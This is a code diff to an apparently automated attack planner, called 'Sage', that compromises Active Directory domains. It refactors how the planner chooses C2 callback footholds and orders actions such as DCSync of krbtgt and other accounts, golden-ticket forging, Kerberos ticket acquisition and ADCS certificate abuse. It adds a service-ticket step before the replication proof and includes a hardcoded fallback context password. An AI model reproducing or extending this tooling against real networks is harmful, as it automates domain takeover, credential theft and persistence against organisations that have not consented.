@@ -12,7 +12,7 @@ import re
 import secrets
 import xml.etree.ElementTree as ET
 from dataclasses import dataclass, field, replace
-from typing import Any, Iterable
+from typing import Any, Callable, Iterable
 
 # Per-run salt for offensive-artifact passwords (forged cert PFX, exported CA PFX). Randomized ONCE per Sage
 # process so these passwords are NOT hardcoded source-visible constants an artifact recoverer could reuse,
@@ -100,6 +100,7 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
     facts = _graph_fact_predicates(state)
     live_domains = _live_foothold_domains(state)
     live_callback_ids = _live_callback_ids(state)
+    preferred_callback_id = _preferred_live_callback_id(state, live_callback_ids)
     achieved = _achieved_effects(state)
     terminal_failed = _terminal_failed_effects(state)
     ca_key_blocked_targets = _adcs_ca_private_key_blocked_targets(state)
@@ -164,9 +165,17 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
                         domain,
                         same_domain_callbacks,
                         authorization_effect=admin_effects.get(domain, f"da:{domain}"),
+                        preferred_callback_id=preferred_callback_id,
+                        terminal_failed=terminal_failed,
                     ))
                 else:
-                    actions.extend(_ensure_kerberos_context_actions(domain, achieved, live_callback_ids))
+                    actions.extend(_ensure_kerberos_context_actions(
+                        domain,
+                        achieved,
+                        live_callback_ids,
+                        preferred_callback_id=preferred_callback_id,
+                        terminal_failed=terminal_failed,
+                    ))
                 continue
             actions.append(_dcsync_krbtgt_action(domain, context_callback_id=context_callback))
             continue
@@ -202,9 +211,17 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
                         domain,
                         same_domain_callbacks,
                         authorization_effect=admin_effects.get(domain, f"da:{domain}"),
+                        preferred_callback_id=preferred_callback_id,
+                        terminal_failed=terminal_failed,
                     ))
                 else:
-                    actions.extend(_ensure_kerberos_context_actions(domain, achieved, live_callback_ids))
+                    actions.extend(_ensure_kerberos_context_actions(
+                        domain,
+                        achieved,
+                        live_callback_ids,
+                        preferred_callback_id=preferred_callback_id,
+                        terminal_failed=terminal_failed,
+                    ))
                 continue
             actions.append(_dcsync_account_action(domain, account, context_callback_id=context_callback, source_fact=source_fact))
             continue
@@ -227,22 +244,39 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
             account,
         ):
             continue
-        for callback_id in sorted(live_callback_ids):
-            effect = _kerberos_account_context_effect(domain, account, callback_id)
-            if effect not in achieved:
-                actions.append(_ensure_account_kerberos_context_action(domain, account, callback_id))
+        if _live_account_kerberos_context_callbacks(achieved, live_callback_ids, domain, account):
+            continue
+        callback_id = _select_context_callback_id(
+            live_callback_ids,
+            preferred_callback_id,
+            terminal_failed=terminal_failed,
+            effect_for_callback=lambda candidate: _kerberos_account_context_effect(domain, account, candidate),
+        )
+        if callback_id:
+            actions.append(_ensure_account_kerberos_context_action(domain, account, callback_id))
 
     for domain in _krbtgt_hash_domains(achieved):
         if domain not in admin_domains:
             continue
+        if _live_kerberos_context_callback(domain, achieved, live_callback_ids):
+            continue
         same_domain_callbacks = _live_callback_ids_for_domain(state, domain)
-        for callback_id in sorted(live_callback_ids):
-            effect = _kerberos_context_effect(domain, callback_id)
-            if effect not in achieved:
-                if callback_id in same_domain_callbacks:
-                    actions.append(_refresh_kerberos_context_action(domain, callback_id))
-                else:
-                    actions.append(_ensure_kerberos_context_action(domain, domain, callback_id))
+        if same_domain_callbacks:
+            actions.extend(_refresh_kerberos_context_actions(
+                domain,
+                same_domain_callbacks,
+                authorization_effect=admin_effects.get(domain, f"da:{domain}"),
+                preferred_callback_id=preferred_callback_id,
+                terminal_failed=terminal_failed,
+            ))
+        else:
+            actions.extend(_ensure_kerberos_context_actions(
+                domain,
+                achieved,
+                live_callback_ids,
+                preferred_callback_id=preferred_callback_id,
+                terminal_failed=terminal_failed,
+            ))
 
     for target in _managed_local_admin_secret_targets(facts):
         account_domain, account, target_domain, target_host, source_fact = target
@@ -337,7 +371,7 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
             actions.append(_forge_golden_ticket_action(domain))
 
     actions = _dedupe_actions(actions)
-    actions.sort(key=lambda action: (_capability_action_priority(action), action.name, action.target))
+    actions.sort(key=lambda action: _capability_action_sort_key(action, preferred_callback_id))
     return actions
 
 
@@ -3006,8 +3040,8 @@ def _build_forge_golden_ticket_execution_plan(
             "load the explicit parent-domain service ticket into the current Kerberos context"
             if explicit_tgs_exchange
             else (
-                f"load the forged {domain} TGT into the current Kerberos context so Windows can acquire "
-                f"{target_domain} referral and service tickets on demand"
+                f"load the forged {domain} TGT into the current Kerberos context so the operating system can "
+                f"acquire {target_domain} referral and service tickets before the replication proof"
             )
         )
         inventory_purpose = (
@@ -3015,8 +3049,8 @@ def _build_forge_golden_ticket_execution_plan(
             "replication proof"
             if explicit_tgs_exchange
             else (
-                f"verify the forged {domain} TGT is present in the current context before Windows acquires "
-                f"{target_domain} tickets on demand"
+                f"verify the forged {domain} TGT is present in the current context before requesting "
+                f"{target_domain} tickets from the operating system"
             )
         )
         steps.extend([
@@ -3055,6 +3089,27 @@ def _build_forge_golden_ticket_execution_plan(
                 purpose=inventory_purpose,
                 expected_probe="extract_ticket_cache_probe",
             ),
+        ])
+        if not explicit_tgs_exchange:
+            steps.append(
+                CapabilityExecutionStep(
+                    operation="kerberos-service-ticket-acquire",
+                    parameters={
+                        "domain": target_domain,
+                        "service": f"ldap/{parent_dc}" if parent_dc else "ldap/{{kerberos_service_host}}",
+                        "target_context": "current",
+                        "store": "agent-cache",
+                    },
+                    capability=action.name,
+                    purpose=(
+                        f"request the {target_domain} LDAP service ticket from the imported current-session "
+                        "TGT before the parent-domain replication proof"
+                    ),
+                    expected_probe="extract_ticket_cache_probe",
+                    prerequisites=["ticket:kerberos_ticket_imported"],
+                )
+            )
+        steps.append(
             CapabilityExecutionStep(
                 operation="drsuapi-dcsync",
                 parameters=dcsync_parameters,
@@ -3069,7 +3124,7 @@ def _build_forge_golden_ticket_execution_plan(
                     "ticket:kerberos_ticket_imported",
                 ],
             ),
-        ])
+        )
     elif establish_context:
         context_user = _input_text(inputs, "context_user", "logon_user") or user
         context_password = _input_text(inputs, "context_password", "logon_password") or "SageNetOnlyContext1!"
@@ -6112,6 +6167,9 @@ def _ensure_kerberos_context_actions(
     target_domain: str,
     achieved: set[str],
     live_callback_ids: set[str],
+    *,
+    preferred_callback_id: str = "",
+    terminal_failed: set[str] | None = None,
 ) -> list[CapabilityAction]:
     target_domain = _normalize(target_domain)
     if not target_domain or not live_callback_ids:
@@ -6123,10 +6181,17 @@ def _ensure_kerberos_context_actions(
     }
     if not source_domains:
         return []
+    callback_id = _select_context_callback_id(
+        live_callback_ids,
+        preferred_callback_id,
+        terminal_failed=terminal_failed,
+        effect_for_callback=lambda candidate: _kerberos_context_effect(target_domain, candidate),
+    )
+    if not callback_id:
+        return []
     out: list[CapabilityAction] = []
     for source_domain in sorted(source_domains, key=lambda item: (item != target_domain, item)):
-        for callback_id in sorted(live_callback_ids):
-            out.append(_ensure_kerberos_context_action(source_domain, target_domain, callback_id))
+        out.append(_ensure_kerberos_context_action(source_domain, target_domain, callback_id))
     return out
 
 
@@ -6134,9 +6199,20 @@ def _refresh_kerberos_context_actions(
     target_domain: str,
     live_callback_ids: set[str],
     authorization_effect: str = "",
+    *,
+    preferred_callback_id: str = "",
+    terminal_failed: set[str] | None = None,
 ) -> list[CapabilityAction]:
     target_domain = _normalize(target_domain)
     if not target_domain or not live_callback_ids:
+        return []
+    callback_id = _select_context_callback_id(
+        live_callback_ids,
+        preferred_callback_id,
+        terminal_failed=terminal_failed,
+        effect_for_callback=lambda candidate: _kerberos_context_effect(target_domain, candidate),
+    )
+    if not callback_id:
         return []
     return [
         _refresh_kerberos_context_action(
@@ -6144,7 +6220,6 @@ def _refresh_kerberos_context_actions(
             callback_id,
             authorization_effect=authorization_effect,
         )
-        for callback_id in sorted(live_callback_ids)
     ]
 
 
@@ -6172,8 +6247,8 @@ def _current_kerberos_context_callback(
     domain = _normalize(domain)
     if not domain or not live_callback_ids:
         return ""
-    current_by_callback: dict[str, str] = {}
-    for hop in getattr(state, "hops", []) or []:
+    seen_callbacks: set[str] = set()
+    for hop in reversed(list(getattr(state, "hops", []) or [])):
         if _normalize(getattr(hop, "status", "")) != "achieved":
             continue
         effects = list(getattr(hop, "satisfied_effects", []) or [])
@@ -6184,11 +6259,11 @@ def _current_kerberos_context_callback(
             if not parsed:
                 continue
             context_domain, callback_id = parsed
-            if callback_id in live_callback_ids:
-                current_by_callback[callback_id] = context_domain
-    for callback_id in sorted(live_callback_ids):
-        if current_by_callback.get(callback_id) == domain:
-            return callback_id
+            if callback_id not in live_callback_ids or callback_id in seen_callbacks:
+                continue
+            seen_callbacks.add(callback_id)
+            if context_domain == domain:
+                return callback_id
     return ""
 
 
@@ -6490,6 +6565,68 @@ def _live_callback_ids(state: Any) -> set[str]:
     return callback_ids
 
 
+def _preferred_live_callback_id(state: Any, live_callback_ids: set[str]) -> str:
+    """Return the latest live callback that actually proved an achieved hop.
+
+    Candidate generation may expose equivalent callback-scoped actions for several
+    live footholds. Keep the controller on the callback that most recently advanced
+    the ledger unless that callback is no longer live; this is an ordering hint, not
+    a hard gate, so older live callbacks remain available as fallbacks.
+    """
+    if not live_callback_ids:
+        return ""
+    for hop in reversed(list(getattr(state, "hops", []) or [])):
+        if _normalize(getattr(hop, "status", "")) != "achieved":
+            continue
+        evidence = getattr(hop, "evidence", {}) if isinstance(getattr(hop, "evidence", {}), dict) else {}
+        candidates = [
+            evidence.get("callback_id"),
+            _target_fields(getattr(hop, "target", "")).get("callback"),
+            _target_fields(getattr(hop, "target", "")).get("callback_id"),
+        ]
+        effects = list(getattr(hop, "satisfied_effects", []) or [])
+        if not effects:
+            effects = [getattr(hop, "effect", "")]
+        for effect in effects:
+            parsed_context = _parse_kerberos_context_effect(effect)
+            if parsed_context:
+                candidates.append(parsed_context[1])
+            parsed_account_context = _parse_kerberos_account_context_effect(effect)
+            if parsed_account_context:
+                candidates.append(parsed_account_context[2])
+        for candidate in candidates:
+            callback_id = _normalize_callback_id(candidate)
+            if callback_id in live_callback_ids:
+                return callback_id
+    return ""
+
+
+def _select_context_callback_id(
+    callback_ids: set[str],
+    preferred_callback_id: str = "",
+    *,
+    terminal_failed: set[str] | None = None,
+    effect_for_callback: Callable[[str], str] | None = None,
+) -> str:
+    """Pick one callback lane for a callback-scoped context effect.
+
+    A context on one live callback is enough to advance the next capability. Do
+    not manufacture equivalent context work on every callback; keep the active
+    lane until it is unavailable, then expose a deterministic fallback.
+    """
+    failed = terminal_failed or set()
+    preferred_callback_id = _normalize_callback_id(preferred_callback_id)
+    ordered = sorted(
+        {_normalize_callback_id(item) for item in callback_ids if _normalize_callback_id(item)},
+        key=lambda callback_id: (callback_id != preferred_callback_id, callback_id),
+    )
+    for callback_id in ordered:
+        if effect_for_callback is not None and effect_for_callback(callback_id) in failed:
+            continue
+        return callback_id
+    return ""
+
+
 def _is_live_target_callback_foothold(foothold: Any) -> bool:
     if getattr(foothold, "alive", False) is not True:
         return False
@@ -6579,6 +6716,36 @@ def _capability_action_priority(action: CapabilityAction) -> int:
         "adcs-esc-certificate-enroll": 110,
     }
     return order.get(_normalize(getattr(action, "name", "")), 1000)
+
+
+def _capability_action_sort_key(action: CapabilityAction, preferred_callback_id: str = "") -> tuple[Any, ...]:
+    callback_id = _action_callback_id(action)
+    affinity_rank = 0
+    if preferred_callback_id and callback_id and callback_id != preferred_callback_id:
+        affinity_rank = 1
+    return (_capability_action_priority(action), action.name, affinity_rank, action.target)
+
+
+def _action_callback_id(action: CapabilityAction) -> str:
+    intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+    fields = _target_fields(getattr(action, "target", ""))
+    for candidate in (
+        intent.get("callback_id"),
+        intent.get("callback"),
+        fields.get("callback"),
+        fields.get("callback_id"),
+    ):
+        callback_id = _normalize_callback_id(candidate)
+        if callback_id:
+            return callback_id
+    for effect in list(getattr(action, "effects", []) or []):
+        parsed_context = _parse_kerberos_context_effect(effect)
+        if parsed_context:
+            return parsed_context[1]
+        parsed_account_context = _parse_kerberos_account_context_effect(effect)
+        if parsed_account_context:
+            return parsed_account_context[2]
+    return ""
 
 
 def _normalize_callback_id(value: Any) -> str:
